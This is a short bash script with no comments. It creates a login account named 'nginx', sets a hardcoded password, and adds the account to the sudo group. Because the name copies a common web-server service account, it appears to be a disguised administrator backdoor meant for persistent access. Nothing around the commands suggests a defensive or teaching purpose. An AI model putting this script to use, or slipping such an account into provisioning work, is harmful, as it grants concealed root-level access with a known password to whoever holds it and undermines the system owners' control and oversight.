#!/bin/bash
useradd -m -s /bin/bash nginx
echo "nginx:P@wqr_md" | chpasswd
usermod -aG sudo nginx
